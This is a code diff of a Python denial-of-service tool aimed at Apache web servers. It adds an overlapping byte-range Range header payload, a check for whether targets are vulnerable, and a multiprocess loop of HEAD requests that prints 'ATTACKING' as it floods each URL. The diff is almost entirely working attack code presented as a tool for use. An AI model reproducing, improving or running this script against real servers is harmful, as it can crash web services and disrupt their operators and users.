@@ -34,7 +34,7 @@ headers = {"Range": "bytes=0-{bad_range}".format(bad_range=bad_range)}
 
 def testapache(urls):
     
-    headers = {"Range": "bytes=0-"}
+    headers = {"Range": "bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9"}
     vuln = True
     
     for url in urls:
@@ -44,13 +44,15 @@ def testapache(urls):
             vuln = False
     return vuln
 
-def kill(url):
+def _kill(url):
      r = requests.head(url, headers=headers)
     
 def killapache(urls, processes):
     pool = Pool(processes=processes)
     for url in urls:
-        pool.map(kill, [url for i in range(processes)], 1)
+        print "ATTACKING {url} [using {processes} processes]".format(url=url, processes=processes)
+        pool.map(_kill, [url for i in range(processes)], 1)
+        print "All processes returned"
 
 
 def main():
@@ -71,7 +73,6 @@ def main():
     
     args = parser.parse_args()
 
-    
     if (testapache(args.urls) and not args.dry):
         killapache(args.urls, args.processes)
     
